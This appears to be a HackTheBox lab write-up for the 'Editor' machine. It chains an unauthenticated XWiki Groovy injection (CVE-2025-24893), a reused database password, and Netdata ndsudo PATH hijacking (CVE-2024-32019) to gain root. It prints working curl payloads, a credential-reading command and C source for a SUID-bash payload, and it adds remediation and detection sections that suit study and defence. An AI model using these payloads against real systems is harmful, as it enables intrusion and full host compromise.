---
layout: default
title: "HackTheBox - Editor"
---

# HackTheBox - Editor

**OS:** Linux

Editor runs a React SPA on port 80 and XWiki 15.10.8 on port 8080. The XWiki
SolrSearch endpoint is vulnerable to an unauthenticated Groovy injection (CVE-2025-24893)
that delivers arbitrary OS command execution without authentication. A read of
`/etc/xwiki/hibernate.cfg.xml` from within the Groovy context exposes a plaintext MySQL
password that is reused as the SSH credential for user `oliver`. `oliver` is a member of
the `netdata` group, granting access to a SUID binary (`ndsudo`) that searches the
operator-controlled PATH for allowlisted commands. Placing a statically compiled C payload
named `nvme` on that PATH and invoking `ndsudo nvme-list` causes the binary to execute it
as root, yielding a SUID shell and the root flag.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (editor.htb / wiki.editor.htb) |
| Initial Access | CVE-2025-24893 XWiki SolrSearch unauthenticated Groovy RCE |
| Privilege Escalation | CVE-2024-32019 ndsudo PATH injection via netdata group membership |
| Final Access | `root` |

---

## Recon

### Port Scan

A full TCP scan returned three open ports: SSH, a React SPA on nginx port 80, and an
XWiki/Jetty instance on port 8080.

```
v0idravl@kali:~$ nmap -sV -sC -p- --min-rate 5000 -oN editor.nmap <target-ip>
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for <target-ip>
Host is up (0.039s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
80/tcp   open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: SimplistCode
8080/tcp open  http    Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
|_http-title: XWiki
```

| Port | Service | Version / Notes |
|---|---|---|
| 22 | SSH | OpenSSH 9.2p1 Debian |
| 80 | HTTP | nginx 1.22.1, SimplistCode React SPA |
| 8080 | HTTP | Jetty 10.0.20, XWiki 15.10.8 |

### Virtual Host Discovery

The React SPA on port 80 references `http://wiki.editor.htb/xwiki/` in its JavaScript
bundle. Both hostnames were added to `/etc/hosts`:

```
v0idravl@kali:~$ echo "<target-ip>  editor.htb wiki.editor.htb" >> /etc/hosts
```

### XWiki Version Fingerprint

Browsing to `http://wiki.editor.htb:8080/xwiki/` reveals the XWiki login page. The
version is confirmed in two places: the `data-xwiki-version` attribute in the page HTML
and the XWiki Preferences admin page at
`/xwiki/bin/view/XWiki/XWikiPreferences`:

```
XWiki 15.10.8
```

> **Why this works:** XWiki discloses its version unauthenticated via several endpoints.
> Knowing the exact version is the first step toward matching a published CVE.

---

## Initial Access

### CVE-2025-24893 -- XWiki SolrSearch Groovy Injection

XWiki 15.10.8 is affected by CVE-2025-24893, an unauthenticated RCE vulnerability
in the SolrSearch RSS endpoint. The endpoint at `/xwiki/bin/get/Main/SolrSearch`
accepts a `text` parameter that is passed to the XWiki rendering engine as wiki
markup. The markup supports `{{groovy}}` macros that execute arbitrary Groovy code on
the server side, and the RSS output mode returns macro output in the feed content,
making exfiltration trivial.

The critical path detail: the endpoint must be requested as `/bin/get/` rather than
`/bin/view/`. The `get` action invokes the raw content renderer, which processes macros
including `{{groovy}}`; `view` enforces a stricter pipeline that blocks the injection.

**Execution confirmation (arithmetic proof):**

```
v0idravl@kali:~$ curl -s "http://wiki.editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async%20async%3dfalse}}{{groovy}}println(%22CHECK:%22%2b(23%2b19)){{/groovy}}{{/async}}" | grep -oP 'CHECK:\d+'
CHECK:42
```

> **Why this works:** The `text` parameter is injected into an XWiki macro context.
> The `}}}` closes any surrounding markup, `{{async async=false}}` forces synchronous
> rendering so output appears in the response, and `{{groovy}}` runs Groovy JVM code.
> The RSS content field in the response carries the `println()` output directly.
> Confirming arithmetic (`23+19=42`) proves real code execution rather than a
> reflection artifact.

**XWiki macro parsing quirks:**

XWiki processes macro bodies before Groovy sees them: single-quoted strings and literal
curly braces inside a `{{groovy}}` block are interpreted by the XWiki renderer first.
The workarounds that applied throughout:
- Use double-quoted strings everywhere (`"..."` not `'...'`).
- Avoid Groovy closures (the `{}` syntax); use `.execute().text` on a plain
  `String` instead of a `GString` interpolation.

**Reading the XWiki database configuration:**

```
v0idravl@kali:~$ PAYLOAD='println("grep connection.password /etc/xwiki/hibernate.cfg.xml".execute().text)'
v0idravl@kali:~$ ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('}}}{{async async=false}}{{groovy}}' + '$PAYLOAD' + '{{/groovy}}{{/async}}'))")
v0idravl@kali:~$ curl -s "http://wiki.editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=${ENCODED}" | grep -oP '<connection.password>[^<]+'
<connection.password>theEd1t0***
```

The file `/etc/xwiki/hibernate.cfg.xml` contains a plaintext MySQL password for the
`xwiki` database user. This is the standard XWiki Hibernate configuration, and the
password is always stored in plaintext at this path.

> **Why this works:** XWiki connects to its database via Hibernate, which stores the
> JDBC connection string, username, and password unencrypted in `hibernate.cfg.xml`.
> Any process or account that can read this file can extract the database credential.
> Here, the Groovy context runs as the `xwiki` OS user, which owns the config file,
> so `Runtime.exec()` can read it directly.

---

## Lateral Movement

### Password Reuse to SSH as `oliver`

The MySQL password from `hibernate.cfg.xml` is reused as the OS-level SSH credential
for `oliver`, the primary local user on the box:

```
v0idravl@kali:~$ ssh oliver@<target-ip>
oliver@<target-ip>'s password: theEd1t0***
Linux editor 6.1.0-31-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.128-1 (2025-02-07) x86_64

oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)

oliver@editor:~$ cat ~/user.txt
<user-flag-redacted>
```

> **Why this works:** Developers and automated installers frequently reuse database
> passwords as OS account passwords, particularly in single-user lab-style deployments.
> The `xwiki` process runs as a service user but the application data is set up by a
> human who picks one password and uses it everywhere.

---

## Privilege Escalation

### CVE-2024-32019 -- ndsudo PATH Injection

`oliver` belongs to the `netdata` group (gid 999). Searching for files with group
ownership of `netdata` and elevated permissions reveals the binary:

```
oliver@editor:~$ find / -group netdata -perm /4000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

`ndsudo` is a SUID root helper for Netdata that allows `netdata`-group members to run
a restricted set of commands as root. The allowlisted commands are hardcoded in the
binary; when invoked with a command name like `nvme-list`, `ndsudo` searches the
current PATH for an executable named `nvme` (dropping the `-list` suffix per its
internal parsing) and executes it as root:

```
oliver@editor:~$ strings /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo | grep nvme
nvme-list
nvme
```

This is CVE-2024-32019: ndsudo trusts the caller's PATH without sanitizing it to a
safe set of directories, allowing substitution of an attacker-controlled binary.

> **Why this works:** The SUID bit causes `ndsudo` to run with effective UID 0. When
> it locates `nvme` via `PATH` lookup and `exec()`s it, the child process inherits
> effective UID 0 from the SUID parent. The OS does not reset effective UID when an
> SUID binary calls `exec()` on a normal binary, only when a shell interpreter
> detects the EUID/RUID mismatch and drops privileges voluntarily. A compiled C binary
> has no such safety check.

**Why shell scripts do not work:**

`bash` (and most shells) detect that effective UID differs from real UID on startup and
drop effective privileges to match real UID. This is a hardened default. Only a compiled
native binary launched from `ndsudo` will retain root effective UID.

**Cross-compiling the payload on Kali:**

No compiler is available on the target. The payload is compiled on the attack box with
static linking so it carries no runtime dependencies:

```c
/* nvme.c -- ndsudo PATH injection payload */
#include <stdio.h>
#include <unistd.h>

int main(void) {
    /* setuid root shell: chmod +s /bin/bash */
    chown("/bin/bash", 0, 0);
    chmod("/bin/bash", 04755);

    /* also read root flag directly */
    FILE *f = fopen("/root/root.txt", "r");
    if (f) {
        char buf[256];
        fgets(buf, sizeof(buf), f);
        fclose(f);
        FILE *out = fopen("/tmp/rf2.txt", "w");
        if (out) { fputs(buf, out); fclose(out); }
    }
    return 0;
}
```

```
v0idravl@kali:~$ gcc -static -o nvme nvme.c
v0idravl@kali:~$ scp nvme oliver@<target-ip>:/dev/shm/nvme
```

**Triggering the injection:**

```
oliver@editor:~$ chmod +x /dev/shm/nvme
oliver@editor:~$ PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
oliver@editor:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 23 11:25 /bin/bash

oliver@editor:~$ /bin/bash -p
bash-5.2# id
uid=1000(oliver) gid=1000(oliver) euid=0(root) groups=1000(oliver),999(netdata)

bash-5.2# cat /tmp/rf2.txt
<root-flag-redacted>

bash-5.2# cat /root/root.txt
<root-flag-redacted>
```

Full root access achieved.

---

## Root Cause

Editor falls to two independent vulnerabilities chained with a credential-reuse weakness:

1. **CVE-2025-24893** -- XWiki SolrSearch does not restrict Groovy macro execution to
   authenticated sessions, and the RSS content mode reflects macro output to the
   unauthenticated caller. Any network-reachable XWiki 15.10.8 instance exposes
   arbitrary JVM code execution with no credentials required.

2. **Plaintext credential in config file reused as an OS password.** The database
   password in `hibernate.cfg.xml` is a deployment artifact that survived into
   production; its reuse as an SSH credential collapsed two separate trust boundaries
   (database, OS) into one secret.

3. **CVE-2024-32019** -- `ndsudo` resolves command names through the caller-controlled
   PATH without restricting the search to safe system directories. Combined with the
   SUID bit, this allows any `netdata`-group member to substitute an arbitrary binary
   for an allowlisted command name and execute it as root.

---

## Impact

An unauthenticated attacker with network access to port 8080 can execute OS commands
as the XWiki process user immediately, with no prior knowledge of the application.
The resulting shell has read access to the database configuration file, which in this
deployment yields an SSH credential that directly opens a login session as a local user.
That user's group membership provides a path to root through a known SUID vulnerability
in an installed service. The full chain from network access to root flag requires no
brute force, no zero-days beyond the published CVEs, and leaves minimal log noise.

In a production deployment this represents complete host compromise, including access
to the XWiki database contents (wiki pages, user records, session data), all files
on the filesystem, and the ability to establish persistence for continued access.

---

## Remediation

**1. Patch or isolate XWiki (highest priority).**
Upgrade XWiki to a version that fixes CVE-2025-24893 or, as an interim control,
restrict access to `/xwiki/bin/get/Main/SolrSearch` to authenticated sessions via the
XWiki rights manager. Place the XWiki instance behind an authentication proxy if an
upgrade cannot be applied immediately. Port 8080 should not be exposed to untrusted
networks.

**2. Rotate and segregate the database credential.**
The `hibernate.cfg.xml` password must not match any OS account password. Adopt a
distinct, randomly generated password for the database user and rotate both the database
and OS credentials immediately. Consider file-system-level permissions so that the
config file is readable only by the XWiki process user and not by other service accounts.

**3. Patch Netdata or remove ndsudo.**
Upgrade Netdata to a version that fixes CVE-2024-32019, which hardens `ndsudo` to
resolve command paths against a safe, fixed list of directories rather than the
caller-controlled PATH. If nvme monitoring is not required, remove the binary or
revoke the SUID bit: `chmod u-s /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo`.
Audit all other SUID binaries on the host.

**4. Restrict netdata group membership.**
`oliver` has no operational reason to belong to the `netdata` group. Remove
non-service accounts from privilege-granting secondary groups. Review all secondary
group assignments on the host.

### Validation

- Confirm the SolrSearch endpoint returns a 403 or authentication redirect for
  unauthenticated requests with `{{groovy}}` in the `text` parameter.
- Verify that the database password and OS user password are distinct values.
- Confirm that `ndsudo` is patched: `ndsudo --version` should report the fixed version,
  and `PATH=/tmp:$PATH ndsudo nvme-list` should fail or search only fixed paths.
- Confirm `oliver` is no longer in the `netdata` group: `groups oliver` should not
  include `netdata`.

---

## Detection Opportunities

- **XWiki Groovy RCE:** HTTP access logs on port 8080 will show GET requests to
  `/xwiki/bin/get/Main/SolrSearch` with `media=rss` and encoded `{{groovy}}` or
  `{{async}}` substrings in the `text` parameter. Alert on these patterns. The XWiki
  application log will record macro rendering events that reference `GroovyScriptEngine`
  or unusual class loads.
- **OS command execution from XWiki:** Process-level telemetry (auditd, eBPF) will show
  child processes forked from the `xwiki` JVM (`java`) with parent-child chains like
  `java -> /bin/sh -> grep` or `java -> /bin/bash`. Unexpected shell children of a
  Java process are a high-fidelity signal.
- **SSH from a service account:** An SSH login for `oliver` (or any account whose
  primary role is application service) from an external address with no prior
  authentication activity is anomalous. Correlate with the XWiki access log timestamp
  to identify the source IP.
- **SUID binary invocation with attacker PATH:** Auditd rule `arch=b64 -S execve` on
  `ndsudo` will capture the exact PATH environment at invocation. A PATH containing
  world-writable directories such as `/dev/shm`, `/tmp`, or `/var/tmp` is a strong
  indicator of hijack attempt.
- **`/bin/bash` SUID bit change:** Monitor for `chmod` calls that set mode `4755` on
  `/bin/bash` via auditd or file-integrity monitoring (AIDE, Wazuh). This is an
  extremely rare legitimate event and a near-certain indicator of compromise.

---

## Lessons Learned

- **The `/bin/get/` vs `/bin/view/` distinction in XWiki is load-bearing.** The same
  payload sent to `view` mode fails silently; only the `get` action invokes the raw
  renderer that processes macros. When testing XWiki injection paths, fuzz the action
  segment, not just the parameters.
- **XWiki macro bodies are pre-processed by the XWiki renderer before Groovy sees them.**
  Single-quoted strings and literal curly braces in Groovy syntax collide with XWiki
  wiki markup parsing. Use double-quoted strings exclusively; test with an arithmetic
  check before attempting file reads.
- **Confirm code execution with a side-channel that is independent of the exploit path.**
  The arithmetic check (`23+19=42` in the RSS body) confirmed real execution before
  attempting file reads that might fail silently. Separating "is code running?" from
  "is my command working?" cuts debugging time significantly.
- **Shell scripts dropped as SUID payloads will not work.** `bash` drops effective
  privileges when EUID differs from RUID. This is documented but often forgotten.
  Compile a C binary when you need to carry effective UID across an exec.
- **Compiled payloads for foreign targets need static linking.** Cross-compiling with
  `-static` removes the libc version dependency and avoids the common failure mode of
  a dynamically linked binary segfaulting because the target's glibc version differs
  from the build host.

---

## Cleanup

- `/dev/shm/nvme` -- the compiled C payload was placed here. Remove after the engagement:
  `rm /dev/shm/nvme`.
- `/tmp/rf2.txt` -- the root flag copy written by the payload. Remove: `rm /tmp/rf2.txt`.
- `/bin/bash` was given the SUID bit (`chmod 04755`). Restore the original permissions
  after the engagement: `chmod 0755 /bin/bash` (as root).
- No Sliver implant was deployed on this box. No listener cleanup required.
- No persistent files were written to the target outside of `/dev/shm` and `/tmp`.
- Verify nothing remains: `ls -la /dev/shm /tmp | grep -v " \."`.
- Archive private engagement notes; verify no lab IP, flag, or credential appears in
  any committed file.
- Run `htb stop` to release the machine.
